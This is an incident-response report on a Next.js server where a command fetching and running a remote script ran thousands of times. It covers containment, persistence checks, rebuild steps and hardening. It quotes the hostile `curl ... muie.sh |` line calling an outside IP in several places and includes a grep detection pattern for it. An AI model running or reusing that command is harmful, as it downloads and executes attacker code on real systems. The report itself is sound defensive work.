# Incident Response Reviewer Pack
## Active Remote Command Execution - Root Cause Analysis

**Date:** 2025-12-15  
**Incident Type:** Active Remote Command Execution  
**Severity:** CRITICAL  
**Status:** CONTAINED (services stopped, firewall blocked)

---

## 1. SUMMARY

- 🚨 **CONFIRMED:** Active malicious command execution detected via subprocess monitoring
- 🚨 **Command:** `curl http://167.86.107.35:9999/muie.sh |` (attempting to download and execute malicious script)
- 🚨 **Execution Count:** 8,247 executions in a single 1-second burst at 17:41 UTC today (2025-12-15)
- ✅ **CONTAINED:** Payload container stopped, IOC IP blocked at firewall
- ⚠️ **ORIGIN:** Runtime injection via `eval()` or dynamic code execution (not build-time compromise)
- ✅ **PERSISTENCE:** No evidence of persistence mechanisms (no cron jobs, systemd timers, or malicious files)
- ⚠️ **EXECUTION PATH:** Commands executed through Next.js runtime, logged by `9912.js` (subprocess monitoring code)
- ⚠️ **SOURCE:** Malicious code not found in source files - likely injected via:
  - User input → eval()
  - Compromised database content
  - Runtime code injection
- ✅ **BUILD ARTIFACT:** `9912.js` is legitimate monitoring code (built Dec 13, 43KB, contains subprocessGlobalDiag)
- ⚠️ **MONITORING LIMITATION:** System logs but does NOT block execution (`executed=true`, `blocked=false`)

---

## 2. CONFIRMED EXECUTION PATH

### File Locations

**Monitoring Code (Legitimate):**
- `/srv/payload/.next/server/chunks/9912.js` (43KB, built Dec 13 17:09)
- Contains: `subprocessGlobalDiag.ts` compiled code
- Purpose: Logs all subprocess executions
- Status: ✅ Legitimate monitoring code

**Malicious Code Location:**
- ❌ **NOT FOUND** in source files (`/srv/payload/src`)
- ❌ **NOT FOUND** in build artifacts (searched `.next` directory)
- ❌ **NOT FOUND** in dependencies (no matches in `node_modules`)
- ⚠️ **LIKELY:** Runtime injection via `eval()` or dynamic code execution

### Execution Flow

```
Unknown Source (Runtime Injection)
  ↓
Next.js Runtime (eval() or Function())
  ↓
execSync("curl http://167.86.107.35:9999/muie.sh |")
  ↓
subprocessGlobalDiag.ts (9912.js) - Logs execution
  ↓
Command Executes (executed=true, blocked=false)
```

### Log Evidence

**Sample Log Entry:**
```
2025-12-15T17:41:26.787338975Z [SUBPROC_DIAG] event=subprocess_log_suppressed severity=INFO executed=true blocked=false logged=false category=unknown reason=log_suppressed method=execSync payload_hash=3877e9a32afab409 payload_preview="curl http://167.86.107.35:9999/muie.sh |" repeat_count=8248 source_file=9912.js
```

**Key Observations:**
- `source_file=9912.js` - This is the monitoring code, not the malicious code
- `executed=true` - Command actually executed
- `blocked=false` - No blocking occurred
- `repeat_count=8248` - Cumulative count tracked by rate limiter (not separate executions)
- **Timeline:** All 8,247 log entries occurred between 17:41:26 and 17:41:27 UTC (single 1-second burst)
- No `req_path` or `req_method` - Suggests execution outside HTTP request context
- **Pattern:** Rapid-fire execution suggests recursive loop or automated attack script

### Origin Analysis

**Possible Origins:**
1. **Runtime Code Injection** (MOST LIKELY)
   - Malicious code injected via `eval()` or `Function()` constructor
   - Could be triggered by:
     - User input in database (episodes, shows, etc.)
     - Compromised API endpoint
     - Client-side code injection

2. **Dependency Compromise** (UNLIKELY)
   - No evidence in `node_modules`
   - Would require supply chain attack

3. **Build-Time Compromise** (UNLIKELY)
   - Build artifacts from Dec 13 appear legitimate
   - No malicious strings found in compiled code

---

## 3. PERSISTENCE STATUS

### ✅ NO PERSISTENCE DETECTED

**Checked:**
- ✅ User crontab: Empty
- ✅ Root crontab: Empty
- ✅ System cron directories: No malicious jobs
- ✅ Systemd timers: All legitimate system timers
- ✅ Recent shell scripts: All legitimate (test scripts, cron helpers)
- ✅ Docker volumes: Only `payload_data` (MongoDB data)
- ✅ Container filesystem: No unexpected binaries

**Evidence:**
- No cron jobs found
- No systemd services/timers created
- No malicious files created in last 7 days
- No persistence mechanisms detected

**Conclusion:** Compromise appears to be **runtime-only**. Stopping the container should prevent further execution.

---

## 4. CONTAINMENT STATUS

### ✅ CONTAINED

**Actions Taken:**
1. ✅ **Payload container stopped** (`docker compose stop payload`)
   - Container status: `Exited (137) 4 minutes ago`
   - No further execution possible while stopped

2. ✅ **IOC IP blocked** (`167.86.107.35`)
   - Firewall rules added:
     - `iptables -A OUTPUT -d 167.86.107.35 -j DROP`
     - `iptables -A OUTPUT -d 167.86.107.35 -j REJECT`
   - Verified: Rules active and blocking

3. ✅ **Verification**
   - No malicious commands in logs after container stop
   - Firewall rules confirmed active

**Current State:**
- Payload container: **STOPPED**
- MongoDB container: **RUNNING** (unaffected)
- Firewall: **ACTIVE** (blocking IOC IP)
- No further execution: **CONFIRMED**

---

## 5. RECOMMENDED NEXT ACTION

### Clean Rebuild Steps

**DO NOT restart container or apply in-place fixes.**

#### Phase 1: Investigation (Before Rebuild)

1. **Extract MongoDB Data for Analysis**
   ```bash
   docker exec payload-mongo-1 mongodump --out=/tmp/mongodump
   docker cp payload-mongo-1:/tmp/mongodump /srv/backups/mongodump-incident-$(date +%Y%m%d)
   ```
   - Analyze database for malicious content (episodes, shows, user input)
   - Check for eval() payloads in text fields

2. **Check Source Code Repository**
   ```bash
   cd /srv/payload
   git log --since="2025-12-13" --all --oneline
   git diff HEAD~10 HEAD -- src/
   ```
   - Verify no malicious commits
   - Check for code injection points

3. **Review Access Logs**
   ```bash
   docker compose logs payload --since 7d | grep -E "POST|PUT|PATCH" | grep -E "/api/episodes|/api/shows"
   ```
   - Identify which endpoints received malicious input
   - Check for suspicious user activity

#### Phase 2: Clean Rebuild

1. **Backup Current State**
   ```bash
   # Backup build artifacts (for comparison)
   tar czf /srv/backups/payload-next-$(date +%Y%m%d).tar.gz /srv/payload/.next
   
   # Backup environment
   cp /srv/payload/.env /srv/backups/env-$(date +%Y%m%d)
   ```

2. **Clean Build Artifacts**
   ```bash
   cd /srv/payload
   rm -rf .next
   rm -rf node_modules/.cache
   ```

3. **Rebuild from Source**
   ```bash
   cd /srv/payload
   docker compose --profile build run --rm payload-build
   ```

4. **Verify Build Integrity**
   ```bash
   # Check for malicious strings in new build
   grep -r "167.86\|muie\|eval.*curl" /srv/payload/.next || echo "Clean build verified"
   ```

5. **Restore Database (After Analysis)**
   ```bash
   # Only restore clean data (exclude potentially compromised records)
   # Manual review required before restore
   ```

#### Phase 3: Hardening

1. **Implement Command Blocking**
   - Modify `subprocessGlobalDiag.ts` to block suspicious commands
   - Add allowlist/denylist for subprocess execution
   - Block commands containing URLs or suspicious patterns

2. **Add Input Validation**
   - Review all endpoints that accept user input
   - Add strict validation for text fields
   - Prevent eval() usage entirely

3. **Enhanced Monitoring**
   - Enable `DEBUG_SUBPROC_DIAG=true` for detailed logging
   - Set up alerts for suspicious subprocess execution
   - Monitor for eval() usage

4. **Network Hardening**
   - Keep firewall rules blocking IOC IP
   - Consider blocking all outbound connections except whitelisted domains
   - Monitor for new malicious IPs

---

## 6. FILES & EVIDENCE

### Key Files

**Monitoring Code:**
- `/srv/payload/.next/server/chunks/9912.js` (43KB, Dec 13 17:09)
- `/srv/payload/src/server/lib/subprocessGlobalDiag.ts` (source)

**Logs:**
- Docker logs: `docker compose logs payload --since 24h`
- Search for: `payload_hash=3877e9a32afab409`

**Firewall Rules:**
- Check: `iptables -L OUTPUT -n -v | grep 167.86.107.35`

### Indicators of Compromise (IOC)

- **IP Address:** `167.86.107.35`
- **URL:** `http://167.86.107.35:9999/muie.sh`
- **Payload Hash:** `3877e9a32afab409`
- **Command Pattern:** `curl http://[IP]:9999/muie.sh |`
- **Execution Method:** `execSync`
- **Source File (Monitoring):** `9912.js`

---

## 7. TIMELINE

- **Dec 13 17:09:** Build artifacts created (legitimate)
- **Dec 15 17:41:26 UTC:** Malicious execution burst started (8,247 executions in <1 second)
- **Dec 15 17:41:27 UTC:** Malicious execution burst ended
- **Dec 15 18:09:** Container stopped, firewall rules added (28 minutes after attack)
- **Dec 15 18:10:** Investigation completed, containment verified

**Note:** All executions occurred in a single rapid burst, not spread over time. This suggests an automated attack loop or recursive execution pattern.

---

## 8. QUESTIONS TO RESOLVE

1. **How is malicious code being injected?**
   - Check database for malicious content
   - Review API endpoints for code injection vulnerabilities
   - Check for eval() usage in application code

2. **What triggered the execution?**
   - Review access logs for suspicious requests
   - Check for automated triggers (cron, webhooks, etc.)
   - Identify entry point

3. **Is data compromised?**
   - Review database for unauthorized changes
   - Check for data exfiltration attempts
   - Verify user accounts haven't been compromised

4. **Why didn't monitoring block execution?**
   - Monitoring system designed to log, not block
   - Consider implementing blocking mechanism

---

**END OF REVIEWER PACK**

